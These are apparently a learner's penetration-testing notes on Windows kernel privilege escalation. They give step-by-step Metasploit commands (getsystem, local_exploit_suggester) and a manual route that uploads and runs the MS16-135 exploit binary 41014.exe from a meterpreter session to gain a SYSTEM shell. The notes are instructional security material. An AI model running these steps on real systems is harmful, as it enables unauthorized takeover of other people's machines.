Kernal Exploit
- Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in sysyems to elevate privileges from one user to anohter,typically to a user with administrator or root access on a system.
- Privilege escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a penetration test.
- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.
- The importance of privilege escalation in the penetration testing process cannot be overstated or overlooked.Developing your privilege escalation skills will mark you out as a good penetration tester.
#### Windows kernel
- A kernal is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system.It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
- Windows NT is the kernal that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy.It consists of two main modes of operatoin that determine access to system resources and hardware
- - User Mode - Program and services running in user mode have limited access to system resources and functionality.
- - Kernal mode - Kernal mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
#### Windows Kernal Exploitation
- Kernel exploits on windows will typically target vulnerabilities in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- This process will differ based on the version of Windows being targeted and the kernel exploit being used.
- Privilege escalation an Windows systems will typically follow the following methodology: 
- - identify kernel vulnerabilities
- - Downloading,compiling and transferring kernel exploits onto the target system.
#### Tools and Environment
- Windows -Exploit-Suggester - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target.It also notifies the user if there are public exploits and metasploit modules available for missing bulletins.
- - https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
- Windows-Kernel-Expoits -Collection of Windows Kernel exploits sorted by CVE
- - https://github.com/SecWiki/windows-kernel-exploits.git

#### After gaining meterpretershell
- getsystem [ this will elevated privileges automatically,if it fails follow furter process]
- background meterpreter sessions
- search suggester
- use  post/multi/recon/local_exploit_suggester
- set all requirements as it is post exploit module it requires to set session
- this will give us different module for previleges escalation we can use these like others modules
- one of module will be successful and give us  meterpreter session with NT AUTHORISE


#### Manual Exploit
- windows-exploit-suggester [ github tool]
- go to meterpreter session [unprevileged]
- sysinfo [ this show all system info]
- copy all the info into text file
- now move to the windows-exploit- suggester  directory
- ./windows-exploit-suggester.py --update [ this will update the database and create xls file like 2021-12-26-mssb.xls]

- ./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt [ here win7.txt is a system info file which previously created ]
- this will give us list of info about the vulnerabilities
- now google for exploit by using MS16-135
- downlaod finding binaries file and transfer it to target system from github to do that move to meterpreter[unprivileged sessions]
- GO to Temp directory by cd
- uplaod ~/Downlaod/41014.exe [ this will upload the binaries into temp directory ]
- shell [ for moving into shell ]
- .\41014.exe  [ this will show how to use it]
- .\41014.exe 7 [this will give us new privileged shell]
